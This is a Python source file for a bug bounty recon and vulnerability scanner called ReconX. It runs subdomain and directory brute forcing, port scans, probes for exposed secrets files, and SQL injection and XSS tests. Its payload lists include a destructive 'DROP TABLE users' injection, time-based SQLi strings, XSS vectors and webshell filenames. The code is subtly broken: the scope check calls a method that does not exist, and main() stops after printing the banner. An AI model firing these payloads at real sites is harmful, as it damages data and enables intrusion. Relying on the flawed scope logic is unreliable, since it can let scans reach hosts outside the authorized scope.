#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║                    ReconX v2.1 — Bug Bounty Recon            ║
║  Subdomain • Ports • Tech • Dirs • SQLi • XSS • Nikto-like  ║
║                                                              ║
║  ⚠  AUTHORIZED TESTING ONLY. Misuse is illegal.             ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import os
import socket
import argparse 
import ssl
import json
import time
import re
import random
import threading
import urllib.parse
import concurrent.futures
from datetime import datetime
from typing import List, Dict, Any, Optional, Set

# ── Dependency loader ──────────────────────────────────────────
def _require(module_str, pip_name):
    try:
        return __import__(module_str)
    except ImportError:
        print(f"\033[91m[!] Missing dependency: pip install {pip_name}\033[0m")
        sys.exit(1)

_require("requests", "requests")
_require("dns", "dnspython")
_require("whois", "python-whois")
_require("bs4", "beautifulsoup4")
_require("colorama", "colorama")

import requests
import dns.resolver
import whois as whois_lib
from bs4 import BeautifulSoup
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=True)

try:
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except Exception:
    pass

# Optional progress bar
try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# ── Colors ─────────────────────────────────────────────────────
R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW
C = Fore.CYAN; M = Fore.MAGENTA; W = Fore.WHITE
DIM = Style.DIM      # <-- FIX: define DIM
RST = Style.RESET_ALL

def info(msg):  print(f"{C}[*]{RST} {msg}")
def good(msg):  print(f"{G}[+]{RST} {msg}")
def warn(msg):  print(f"{Y}[!]{RST} {msg}")
def bad(msg):   print(f"{R}[-]{RST} {msg}")
def vuln(msg):  print(f"{R}[VULN]{RST} {M}{msg}{RST}")
def sep(title): print(f"\n{C}{'═'*60}\n  {Y}{title}\n{C}{'═'*60}{RST}")

# ── Banner ─────────────────────────────────────────────────────
BANNER = f"""
{C}██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗██╗  ██╗
██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║╚██╗██╔╝
██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║ ╚███╔╝
██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║ ██╔██╗
██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║██╔╝ ██╗
╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝{RST}
{Y}        All-in-One Bug Bounty Recon Tool{RST}
{DIM}        v2.1 | Authorized testing only{RST}
"""

# ══════════════════════════════════════════════════════════════
#  WORDLISTS (built‑in)
# ══════════════════════════════════════════════════════════════
SUBDOMAINS = [
    "www","mail","ftp","admin","blog","api","dev","staging","test","app",
    "portal","vpn","remote","secure","dashboard","cdn","static","media",
    "img","images","shop","store","beta","demo","old","new","backup","db",
    "database","server","ns1","ns2","smtp","pop","imap","webmail","forum",
    "wiki","help","support","docs","git","gitlab","jenkins","ci","jira",
    "confluence","monitoring","status","login","auth","sso","oauth","mobile",
    "m","cloud","assets","upload","downloads","files","internal","intranet",
    "corp","prd","prod","uat","qa","sandbox","mx","relay","autodiscover",
    "autoconfig","cpanel","whm","ftp2","smtp2","pop3","exchange","owa",
    "sharepoint","crm","erp","vpn2","remote2","panel","admin2","manage",
    "management","network","firewall","router","gateway","proxy","waf",
    "edge","api2","rest","graphql","microservice","services","service",
]

DIR_WORDLIST = [
    "admin","administrator","login","wp-admin","wp-login.php","phpmyadmin",
    "phpMyAdmin","cpanel","manager","panel","dashboard","console","backend",
    "control","cms","admin.php","admin.html","admin/login",
    "api","api/v1","api/v2","api/v3","graphql","swagger","swagger-ui",
    "swagger-ui.html","api-docs","openapi.json","openapi.yaml",
    "config","configuration",".env",".env.local",".env.production",
    ".git",".git/config",".git/HEAD",".svn/entries",
    "web.config","WEB-INF/web.xml","crossdomain.xml","clientaccesspolicy.xml",
    "backup","backups","bak","old","temp","tmp","archive","dump",
    "backup.zip","backup.sql","db.sql","database.sql",
    "upload","uploads","files","media","images","img","static","assets",
    "public","private","data",
    "robots.txt","sitemap.xml",".htaccess",".htpasswd","server-status",
    "server-info","info.php","phpinfo.php","test.php","debug.php",
    "install","setup","install.php","install/","setup.php",
    "logs","log","error_log","access.log","debug.log",
    "readme.md","README.md","CHANGELOG.md","LICENSE","CHANGELOG",
    "shell.php","cmd.php","webshell.php","c99.php","r57.php",
    "user","users","profile","account","register","forgot-password",
    "reset-password","change-password","logout","signup","signin",
    "health","status","metrics","ping","actuator","actuator/env",
    "actuator/health","actuator/mappings",
    "search","ajax","cgi-bin","v1","v2","v3","home","index.php",
    ".DS_Store","Thumbs.db","thumbs.db",
]

COMMON_PORTS = [
    21,22,23,25,53,80,110,111,135,139,143,161,443,445,993,995,
    1433,1521,2049,2375,2376,3000,3306,3389,4000,5000,5432,5900,
    6379,6443,7001,7080,8000,8008,8080,8088,8443,8888,9000,9090,
    9200,9300,27017,27018,28017,
]

PORT_SERVICES = {
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
    110:"POP3",111:"RPC",135:"MSRPC",139:"NetBIOS",143:"IMAP",
    161:"SNMP",443:"HTTPS",445:"SMB",993:"IMAPS",995:"POP3S",
    1433:"MSSQL",1521:"Oracle",2049:"NFS",2375:"Docker",
    2376:"Docker-TLS",3000:"HTTP-Dev",3306:"MySQL",3389:"RDP",
    4000:"HTTP-Dev",5000:"Flask/Dev",5432:"PostgreSQL",5900:"VNC",
    6379:"Redis",6443:"K8s-API",7001:"WebLogic",8000:"HTTP-Alt",
    8008:"HTTP-Alt",8080:"HTTP-Proxy",8088:"HTTP-Alt",8443:"HTTPS-Alt",
    8888:"Jupyter/Dev",9000:"PHP-FPM",9090:"Prometheus",
    9200:"Elasticsearch",9300:"Elasticsearch",27017:"MongoDB",
    27018:"MongoDB",28017:"MongoDB-Web",
}

SQLI_PAYLOADS = [
    "'", "''", "`", "\"",
    "' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--", "\" OR 1=1--",
    "1 OR 1=1", "' OR 'x'='x", "') OR ('1'='1",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--", "' AND 1=CONVERT(int,@@version)--",
    "' AND SLEEP(2)--", "1 AND SLEEP(2)--",
]

SQLI_ERRORS = [
    "sql syntax","mysql_fetch","ora-","pg_query","sqlite_",
    "syntax error","unclosed quotation","quoted string not properly terminated",
    "microsoft ole db","odbc sql server driver","warning: mysql","mysqli_",
    "you have an error in your sql syntax",
    "supplied argument is not a valid mysql","column count doesn't match",
    "unknown column","division by zero","mssql_","pg_exec",
    "sqlite3.operationalerror","system.data.sqlclient",
    "invalid query","sql command not properly ended",
]

BLIND_SQLI_PAYLOADS = [
    ("' AND SLEEP(5)--", 5),
    ("1 AND SLEEP(5)--", 5),
    ("' AND 1234=SLEEP(5)--", 5),
    ("' OR SLEEP(5)--", 5),
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "'-prompt(1)-'",
    "<details open ontoggle=alert(1)>",
    "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>",
]

NIKTO_PATHS = {
    "/.git/config":              "Git config exposed",
    "/.git/HEAD":                "Git HEAD exposed",
    "/.env":                     ".env file exposed (secrets!)",
    "/.env.local":               ".env.local exposed",
    "/.env.production":          ".env.production exposed",
    "/config.php":               "PHP config exposed",
    "/wp-config.php":            "WordPress config exposed",
    "/config.yml":               "YAML config exposed",
    "/config.json":              "JSON config exposed",
    "/.htpasswd":                "htpasswd exposed",
    "/server-status":            "Apache server-status",
    "/server-info":              "Apache server-info",
    "/phpinfo.php":              "PHPInfo exposed",
    "/info.php":                 "PHPInfo exposed",
    "/test.php":                 "Test PHP file",
    "/debug.php":                "Debug PHP file",
    "/elmah.axd":                "ELMAH log viewer",
    "/.DS_Store":                ".DS_Store exposed",
    "/crossdomain.xml":          "Flash crossdomain policy",
    "/clientaccesspolicy.xml":   "Silverlight policy",
    "/WEB-INF/web.xml":          "Java web.xml exposed",
    "/web.config":               "ASP.NET web.config",
    "/.svn/entries":             "SVN metadata exposed",
    "/admin/":                   "Admin panel found",
    "/administrator/":           "Admin panel found",
    "/manager/html":             "Tomcat Manager",
    "/actuator/env":             "Spring Boot env exposed",
    "/actuator/mappings":        "Spring Boot mappings exposed",
    "/.well-known/security.txt": "Security.txt present",
    "/backup.sql":               "SQL backup exposed",
    "/database.sql":             "SQL database dump",
    "/dump.sql":                 "SQL dump exposed",
    "/swagger-ui.html":          "Swagger UI exposed",
    "/api-docs":                 "API docs exposed",
    "/openapi.json":             "OpenAPI spec exposed",
    "/graphql":                  "GraphQL endpoint",
}

DB_ERROR_SIGS = {
    "MySQL":      ["mysql_fetch_array","you have an error in your sql","mysql_num_rows","warning: mysql"],
    "PostgreSQL": ["pg_query()","pg_exec()","postgresql query failed"],
    "MSSQL":      ["microsoft ole db provider for sql","unclosed quotation mark","mssql_"],
    "Oracle":     ["ora-","oracle error","oracle odbc"],
    "SQLite":     ["sqlite3.operationalerror","sqlite/jdbcdriver","system.data.sqlite"],
    "MongoDB":    ["mongoerror","bsonobj size","mongodb error"],
    "DB2":        ["db2 sql error","com.ibm.db2"],
}

SECURITY_HEADERS = {
    "X-Frame-Options":         "Clickjacking protection",
    "X-XSS-Protection":        "XSS filter (legacy)",
    "X-Content-Type-Options":  "MIME sniffing protection",
    "Strict-Transport-Security":"HSTS",
    "Content-Security-Policy": "CSP",
    "Referrer-Policy":         "Referrer policy",
    "Permissions-Policy":      "Permissions policy",
    "Cross-Origin-Opener-Policy":"COOP",
    "Cross-Origin-Resource-Policy":"CORP",
}

# ══════════════════════════════════════════════════════════════
#  SCANNER CONFIGURATION
# ══════════════════════════════════════════════════════════════
class ScannerConfig:
    def __init__(self, args):
        self.timeout = args.timeout
        self.threads = args.threads
        self.delay = args.delay
        self.verify_ssl = args.verify_ssl
        self.proxy = args.proxy
        self.cookies = args.cookies
        self.user_agent = args.user_agent or (
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/122.0 Safari/537.36"
        )
        self.verbose = args.verbose
        self.progress = args.progress
        self.scope = args.scope
        self.respect_robots = args.robots
        self.dir_status_filter = args.dir_status
        self.sub_wordlist_file = args.sub_wordlist
        self.dir_wordlist_file = args.dir_wordlist
        self.sqli_blind = args.sqli_blind

    def make_session(self):
        sess = requests.Session()
        sess.headers.update({"User-Agent": self.user_agent})
        if self.proxy:
            sess.proxies.update({"http": self.proxy, "https": self.proxy})
        if self.cookies:
            for c in self.cookies.split(";"):
                if "=" in c:
                    k, v = c.split("=", 1)
                    sess.cookies.set(k.strip(), v.strip())
        sess.verify = self.verify_ssl
        return sess

    def delay_sleep(self):
        if self.delay > 0:
            time.sleep(random.uniform(0, self.delay))

    def is_url_in_scope(self, url):
        if not self.scope:
            return True
        host = urllib.parse.urlparse(url).hostname or ""
        return self._host_in_scope(host)

    def is_host_in_scope(self, host):
        if not self.scope:
            return True
        host = host.lower()
        for pattern in self.scope:
            pat = pattern.strip().lower()
            if pat.startswith("*."):
                if host.endswith(pat[1:]) or host == pat[2:]:
                    return True
            elif pat.startswith("*"):
                if host.endswith(pat[1:]):
                    return True
            elif host == pat or host.endswith("." + pat):
                return True
        return False

# ── Thread‑safe print lock ─────────────────────────────────────
_print_lock = threading.Lock()
def safe_print(msg):
    with _print_lock:
        print(msg)

# ── Helper functions ────────────────────────────────────────────
def normalize_url(target):
    if not target.startswith(("http://", "https://")):
        return f"http://{target}"
    return target

def extract_domain(target):
    parsed = urllib.parse.urlparse(normalize_url(target))
    host = parsed.netloc or parsed.path
    return host.split(":")[0]

def resolve_ip(domain):
    try:
        return socket.gethostbyname(domain)
    except Exception:
        return domain

def load_wordlist(filepath, builtin):
    if not filepath:
        return list(set(builtin))
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            extra = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        return list(set(builtin + extra))
    except Exception as e:
        warn(f"Could not load wordlist {filepath}: {e}")
        return list(set(builtin))

def fetch_robots_txt(url, config):
    if not config.respect_robots:
        return set()
    try:
        sess = config.make_session()
        r = sess.get(url.rstrip("/") + "/robots.txt", timeout=config.timeout)
        if r.status_code != 200:
            return set()
        disallowed = set()
        for line in r.text.splitlines():
            line = line.strip()
            if line.lower().startswith("disallow:"):
                path = line.split(":", 1)[1].strip()
                if path:
                    disallowed.add(path)
        good(f"Loaded robots.txt: {len(disallowed)} disallowed path(s)")
        return disallowed
    except Exception:
        return set()

# ══════════════════════════════════════════════════════════════
#  MODULES
# ══════════════════════════════════════════════════════════════

def run_whois(domain, results, config):
    sep("WHOIS LOOKUP")
    try:
        w = whois_lib.whois(domain)
        fields = {
            "Registrar": w.registrar,
            "Created": w.creation_date,
            "Expires": w.expiration_date,
            "Updated": w.updated_date,
            "Name Servers": w.name_servers,
            "Status": w.status,
            "Emails": w.emails,
            "Org": w.org,
            "Country": w.country,
            "DNSSEC": w.dnssec,
        }
        data = {}
        for k, v in fields.items():
            if v:
                display = ", ".join(v) if isinstance(v, list) else str(v)
                if display and display.lower() not in ("none", "[]"):
                    good(f"{k}: {display[:120]}")
                    data[k] = display
        results["whois"] = data
    except Exception as e:
        warn(f"WHOIS failed (use --verbose for details): {e}" if config.verbose else "WHOIS lookup failed")
        results["whois"] = {}

def run_dns(domain, results, config):
    sep("DNS RECORDS")
    dns_results = {}
    for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA","PTR","SRV"]:
        try:
            answers = dns.resolver.resolve(domain, rtype, lifetime=config.timeout)
            records = [r.to_text() for r in answers]
            dns_results[rtype] = records
            good(f"{rtype:6s}: {', '.join(records)}")
        except Exception as e:
            if config.verbose:
                bad(f"{rtype} record lookup failed: {e}")
    if not dns_results:
        bad("No DNS records resolved")
    results["dns"] = dns_results

def _check_sub(sub, domain, config):
    host = f"{sub}.{domain}"
    if not config.is_host_in_scope(host):
        return None, None
    config.delay_sleep()
    try:
        answers = dns.resolver.resolve(host, "A", lifetime=3)
        ips = [r.to_text() for r in answers]
        return host, ips
    except Exception:
        return None, None

def run_subdomain_enum(domain, results, config):
    sep("SUBDOMAIN ENUMERATION")
    wordlist = load_wordlist(config.sub_wordlist_file, SUBDOMAINS)
    info(f"Bruteforcing {len(wordlist)} subdomains...")
    found = []
    total = len(wordlist)
    completed = [0]

    def worker(sub):
        host, ips = _check_sub(sub, domain, config)
        completed[0] += 1
        if config.progress and not TQDM_AVAILABLE and completed[0] % max(1, total//10) == 0:
            safe_print(f"  [*] Subdomain progress: {completed[0]}/{total}")
        return (host, ips) if host else None

    with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as ex:
        futures = {ex.submit(worker, s): s for s in wordlist}
        if TQDM_AVAILABLE and config.progress:
            for f in tqdm(concurrent.futures.as_completed(futures), total=total, desc="Subdomains"):
                result = f.result()
                if result:
                    host, ips = result
                    good(f"Found → {host} [{', '.join(ips)}]")
                    found.append({"subdomain": host, "ips": ips})
        else:
            for f in concurrent.futures.as_completed(futures):
                result = f.result()
                if result:
                    host, ips = result
                    good(f"Found → {host} [{', '.join(ips)}]")
                    found.append({"subdomain": host, "ips": ips})
    if not found:
        bad("No subdomains found (try a larger wordlist with --sub-wordlist)")
    else:
        info(f"Total subdomains found: {len(found)}")
    results["subdomains"] = found

def _scan_port(host, port, config):
    config.delay_sleep()
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(config.timeout)
        if sock.connect_ex((host, port)) != 0:
            sock.close()
            return port, False, ""
        banner = ""
        try:
            if port in (80,8080,8000,8008,8088):
                sock.sendall(b"HEAD / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            else:
                sock.sendall(b"\r\n")
            banner = sock.recv(1024).decode("utf-8", errors="ignore").strip()[:200]
        except Exception:
            pass
        sock.close()
        return port, True, banner
    except Exception:
        return port, False, ""

def _ssl_info(host, port, config):
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(config.timeout)
            s.connect((host, port))
            cert = s.getpeercert()
            return {
                "subject": dict(x[0] for x in cert.get("subject", [])),
                "issuer": dict(x[0] for x in cert.get("issuer", [])),
                "expires": cert.get("notAfter", ""),
                "san": [v for t, v in cert.get("subjectAltName", []) if t == "DNS"],
            }
    except Exception:
        return {}

def run_port_scan(host, results, config, ports=None):
    sep("PORT SCAN + BANNER GRAB")
    target_ports = ports or COMMON_PORTS
    info(f"Scanning {len(target_ports)} ports on {host} ...")
    open_ports = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as ex:
        futures = {ex.submit(_scan_port, host, p, config): p for p in target_ports}
        for f in concurrent.futures.as_completed(futures):
            port, is_open, banner = f.result()
            if is_open:
                svc = PORT_SERVICES.get(port, "unknown")
                line = f"Port {port:5d}/tcp  OPEN  [{svc}]"
                if banner:
                    line += f"  →  {banner[:60].replace(chr(10),' ')}"
                good(line)
                entry = {"port": port, "service": svc, "banner": banner}
                if port == 443:
                    ssl_data = _ssl_info(host, port, config)
                    if ssl_data:
                        entry["ssl"] = ssl_data
                        good(f"  SSL expires: {ssl_data.get('expires','?')} | SANs: {ssl_data.get('san',[])}")
                open_ports.append(entry)
    open_ports.sort(key=lambda x: x["port"])
    if not open_ports:
        bad("No open ports found")
    else:
        info(f"Total open ports: {len(open_ports)}")
    results["ports"] = open_ports

CMS_SIGS = {
    "WordPress": ["wp-content","wp-includes","wp-json"],
    "Joomla": ["joomla","/components/com_"],
    "Drupal": ["drupal","sites/default"],
    "Magento": ["magento"],
    "Laravel": ["csrf-token","_token"],
    "Django": ["csrfmiddlewaretoken"],
    "Flask": ["werkzeug"],
    "Express.js": ["x-powered-by: express"],
    "React": ["react","__react"],
    "Angular": ["ng-version"],
    "Next.js": ["__next"],
    "Spring": ["x-application-context"],
    "ASP.NET": ["__viewstate"],
    "Nginx": ["nginx"],
    "Apache": ["apache"],
    "IIS": ["iis","microsoft-iis"],
    "Cloudflare": ["cf-ray"],
    "AWS": ["x-amz-"],
}

def run_tech_fingerprint(url, results, config):
    sep("TECH FINGERPRINTING")
    try:
        sess = config.make_session()
        r = sess.get(url, timeout=config.timeout, allow_redirects=True)
        h = dict(r.headers)
        body = r.text.lower()
        tech = []
        for hdr in ("Server","X-Powered-By","X-Generator","X-CMS","X-Runtime"):
            val = h.get(hdr,"")
            if val:
                good(f"{hdr}: {val}")
                tech.append(f"{hdr}={val}")
        info("Detecting frameworks...")
        for name, sigs in CMS_SIGS.items():
            combined = body + " " + " ".join(h.values()).lower()
            if any(s.lower() in combined for s in sigs):
                good(f"Detected: {name}")
                tech.append(name)
        info("Security headers...")
        missing = []
        for hdr, desc in SECURITY_HEADERS.items():
            if hdr in h:
                good(f"✓ {hdr}: {h[hdr][:60]}")
            else:
                warn(f"✗ Missing → {hdr} ({desc})")
                missing.append(hdr)
        info("Cookie security...")
        for c in r.cookies:
            flags = []
            if not c.has_nonstandard_attr("HttpOnly"): flags.append("No HttpOnly")
            if not c.secure: flags.append("No Secure")
            if not c.has_nonstandard_attr("SameSite"): flags.append("No SameSite")
            if flags:
                warn(f"Cookie '{c.name}': {', '.join(flags)}")
        good(f"Status: {r.status_code} | Final URL: {r.url}")
        results["tech"] = {
            "status": r.status_code,
            "final_url": r.url,
            "response_headers": h,
            "tech_stack": tech,
            "missing_security_headers": missing,
        }
    except Exception as e:
        warn(f"Tech fingerprint failed: {e}" if config.verbose else "Tech fingerprint failed (use --verbose for details)")
        results["tech"] = {}

def _check_dir(base_url, path, found, config, robots_disallowed=set()):
    if robots_disallowed and path in robots_disallowed:
        return
    url = f"{base_url.rstrip('/')}/{path.lstrip('/')}"
    if not config.is_url_in_scope(url):
        return
    config.delay_sleep()
    try:
        sess = config.make_session()
        r = sess.get(url, timeout=config.timeout, allow_redirects=False)
        code = r.status_code
        size = len(r.content)
        allowed = config.dir_status_filter
        if allowed and code not in allowed:
            return
        if not allowed and code not in (200,201,301,302,403,500):
            return
        color = G if code == 200 else (Y if code in (301,302,403) else R)
        safe_print(f"  {color}[{code}]{RST} {url} ({size}B)")
        with _dir_lock:
            found.append({"url": url, "status": code, "size": size})
    except Exception as e:
        if config.verbose:
            safe_print(f"  [!] {url}: {e}")

_dir_lock = threading.Lock()

def run_dir_bruteforce(url, results, config):
    sep("DIRECTORY & FILE BRUTEFORCE")
    robots_disallowed = fetch_robots_txt(url, config)
    wordlist = load_wordlist(config.dir_wordlist_file, DIR_WORDLIST)
    info(f"Testing {len(wordlist)} paths...")
    found = []
    total = len(wordlist)
    completed = [0]

    def worker(path):
        _check_dir(url, path, found, config, robots_disallowed)
        completed[0] += 1
        if config.progress and not TQDM_AVAILABLE and completed[0] % max(1, total//10) == 0:
            safe_print(f"  [*] Dir progress: {completed[0]}/{total}")

    with concurrent.futures.ThreadPoolExecutor(max_workers=config.threads) as ex:
        futures = [ex.submit(worker, p) for p in wordlist]
        if TQDM_AVAILABLE and config.progress:
            for _ in tqdm(concurrent.futures.as_completed(futures), total=total, desc="Directories"):
                pass
        else:
            for f in concurrent.futures.as_completed(futures):
                pass
    info(f"Found {len(found)} accessible paths")
    results["directories"] = sorted(found, key=lambda x: x["status"])

def run_broken_links(url, results, config):
    sep("BROKEN LINK SCANNER")
    try:
        sess = config.make_session()
        r = sess.get(url, timeout=config.timeout)
        soup = BeautifulSoup(r.text, "html.parser")
        links = set()
        for tag in soup.find_all(["a","link","script","img","iframe","form"]):
            for attr in ("href","src","action"):
                val = tag.get(attr)
                if val:
                    full = urllib.parse.urljoin(url, val)
                    if full.startswith("http"):
                        links.add(full)
        info(f"Discovered {len(links)} links, checking up to 150...")
        broken = []
        def _chk(link):
            if not config.is_url_in_scope(link):
                return None
            config.delay_sleep()
            try:
                resp = config.make_session().head(link, timeout=config.timeout, allow_redirects=True)
                if resp.status_code >= 400:
                    warn(f"Broken [{resp.status_code}] → {link}")
                    return {"url": link, "status": resp.status_code}
            except Exception:
                warn(f"Broken [ERR] → {link}")
                return {"url": link, "status": "error"}
            return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
            for res in ex.map(_chk, list(links)[:150]):
                if res:
                    broken.append(res)
        good(f"{len(broken)} broken links found")
        results["broken_links"] = broken
    except Exception as e:
        warn(f"Broken link check failed: {e}" if config.verbose else "Broken link check failed")
        results["broken_links"] = []

def run_nikto_checks(url, results, config):
    sep("WEB VULNERABILITY CHECKS (Nikto-like)")
    findings = []
    def _chk(path, desc):
        full = f"{url.rstrip('/')}{path}"
        if not config.is_url_in_scope(full):
            return None
        config.delay_sleep()
        try:
            r = config.make_session().get(full, timeout=config.timeout, allow_redirects=False)
            if r.status_code == 200:
                vuln(f"{desc}"); good(f"  URL: {full}")
                return {"url": full, "status": 200, "finding": desc, "severity": "high"}
            elif r.status_code == 403:
                warn(f"Restricted (403) — {desc}  [{full}]")
                return {"url": full, "status": 403, "finding": desc, "severity": "medium"}
        except Exception as e:
            if config.verbose:
                bad(f"Check failed for {full}: {e}")
        return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = {ex.submit(_chk, path, desc): path for path, desc in NIKTO_PATHS.items()}
        for f in concurrent.futures.as_completed(futures):
            res = f.result()
            if res:
                findings.append(res)
    if not findings:
        good("No common sensitive paths exposed")
    results["nikto_checks"] = findings

def run_db_error_check(url, results, config):
    sep("DATABASE ERROR DETECTION")
    sep_char = "&" if "?" in url else "?"
    test_url = url + sep_char + "id='"
    try:
        r = config.make_session().get(test_url, timeout=config.timeout)
        body = r.text.lower()
        found_dbs = []
        for db, patterns in DB_ERROR_SIGS.items():
            for p in patterns:
                if p.lower() in body:
                    vuln(f"{db} error leaked!")
                    good(f"  Pattern: '{p}' | Test URL: {test_url}")
                    found_dbs.append({"db": db, "pattern": p, "test_url": test_url})
                    break
        if not found_dbs:
            good("No database errors leaked")
        results["db_errors"] = found_dbs
    except Exception as e:
        warn(f"DB error check failed: {e}" if config.verbose else "DB error check failed")
        results["db_errors"] = []

def _test_sqli(base_url, param, payload, config, blind=False):
    config.delay_sleep()
    try:
        parsed = urllib.parse.urlparse(base_url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params)))
        sess = config.make_session()
        if blind:
            start = time.time()
            sess.get(test_url, timeout=config.timeout+10)
            elapsed = time.time() - start
            return elapsed > 4.5, test_url, f"Time: {elapsed:.2f}s"
        else:
            r = sess.get(test_url, timeout=config.timeout)
            for err in SQLI_ERRORS:
                if err.lower() in r.text.lower():
                    return True, test_url, err
            return False, "", ""
    except Exception:
        return False, "", ""

def run_sqli_scan(url, results, config):
    sep("SQL INJECTION SCANNER")
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params:
        warn("No GET parameters in URL — pass ?id=1 etc.")
        results["sqli"] = []
        return
    vulns = []
    for param in params:
        hit = False
        for payload in SQLI_PAYLOADS:
            found, test_url, err = _test_sqli(url, param, payload, config, blind=False)
            if found:
                vuln(f"SQLi in param '{param}' (error-based)")
                good(f"  Payload: {payload}  Error: {err}  URL: {test_url}")
                vulns.append({"param":param,"payload":payload,"url":test_url,"error":err,"type":"error"})
                hit = True; break
        if not hit and config.sqli_blind:
            for payload, _ in BLIND_SQLI_PAYLOADS:
                found, test_url, info_str = _test_sqli(url, param, payload, config, blind=True)
                if found:
                    vuln(f"Blind SQLi in param '{param}'")
                    good(f"  Payload: {payload}  {info_str}  URL: {test_url}")
                    vulns.append({"param":param,"payload":payload,"url":test_url,"error":info_str,"type":"blind"})
                    hit = True; break
        if not hit:
            good(f"Param '{param}' — no SQLi detected")
    results["sqli"] = vulns

def _test_xss(base_url, param, payload, config):
    config.delay_sleep()
    try:
        parsed = urllib.parse.urlparse(base_url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = payload
        test_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(params)))
        r = config.make_session().get(test_url, timeout=config.timeout)
        if payload in r.text:
            return True, test_url
    except Exception:
        pass
    return False, ""

def run_xss_scan(url, results, config):
    sep("XSS SCANNER (Reflected)")
    parsed = urllib.parse.urlparse(url)
    params = dict(urllib.parse.parse_qsl(parsed.query))
    if not params:
        warn("No GET parameters in URL")
        results["xss"] = []
        return
    vulns = []
    for param in params:
        hit = False
        for payload in XSS_PAYLOADS:
            found, test_url = _test_xss(url, param, payload, config)
            if found:
                vuln(f"Reflected XSS in param '{param}'")
                good(f"  Payload: {payload}  URL: {test_url}")
                vulns.append({"param":param,"payload":payload,"url":test_url})
                hit = True; break
        if not hit:
            good(f"Param '{param}' — no reflected XSS detected")
    results["xss"] = vulns

# ── Report ─────────────────────────────────────────────────────
def save_report(results, filepath):
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, default=str)
    good(f"JSON report saved → {filepath}")

def print_summary(results):
    sep("SCAN SUMMARY")
    scans = results.get("scans", {})
    counts = {
        "Subdomains found":      len(scans.get("subdomains", [])),
        "Open ports":            len(scans.get("ports", [])),
        "Accessible dirs":       len([d for d in scans.get("directories",[]) if d["status"]==200]),
        "Broken links":          len(scans.get("broken_links", [])),
        "Nikto findings":        len(scans.get("nikto_checks", [])),
        "DB errors leaked":      len(scans.get("db_errors", [])),
        "SQLi vulnerabilities":  len(scans.get("sqli", [])),
        "XSS vulnerabilities":   len(scans.get("xss", [])),
    }
    any_vuln = False
    for label, count in counts.items():
        color = G if count == 0 else (R if "vuln" in label.lower() or "error" in label.lower() else Y)
        print(f"  {color}{label:<28}{RST} {count}")
        if count > 0 and ("vuln" in label.lower() or "error" in label.lower()):
            any_vuln = True
    print()
    if any_vuln:
        vuln("Vulnerabilities detected! Review the report carefully.")
    else:
        good("No critical vulnerabilities auto-detected (always verify manually!)")

# ── Orchestrator ───────────────────────────────────────────────
def run_scan(args):
    target = args.target
    url = normalize_url(target)
    domain = extract_domain(target)
    ip = resolve_ip(domain)
    config = ScannerConfig(args)
    results = {
        "target": target,
        "url": url,
        "domain": domain,
        "ip": ip,
        "timestamp": datetime.now().isoformat(),
        "scans": {},
    }
    good(f"Target : {domain}")
    good(f"IP     : {ip}")
    good(f"URL    : {url}")

    s = results["scans"]
    if not args.skip_whois:   run_whois(domain, s, config)
    if not args.skip_dns:     run_dns(domain, s, config)
    if not args.skip_sub:     run_subdomain_enum(domain, s, config)
    if not args.skip_ports:
        ports = [int(p) for p in args.ports.split(",")] if args.ports else None
        run_port_scan(ip, s, config, ports)
    if not args.skip_tech:    run_tech_fingerprint(url, s, config)
    if not args.skip_dirs:    run_dir_bruteforce(url, s, config)
    if not args.skip_links:   run_broken_links(url, s, config)
    if not args.skip_nikto:   run_nikto_checks(url, s, config)
    if not args.skip_db:      run_db_error_check(url, s, config)
    if not args.skip_sqli:    run_sqli_scan(url, s, config)
    if not args.skip_xss:     run_xss_scan(url, s, config)
    return results

# ── CLI ────────────────────────────────────────────────────────
def main():
    print(BANNER)
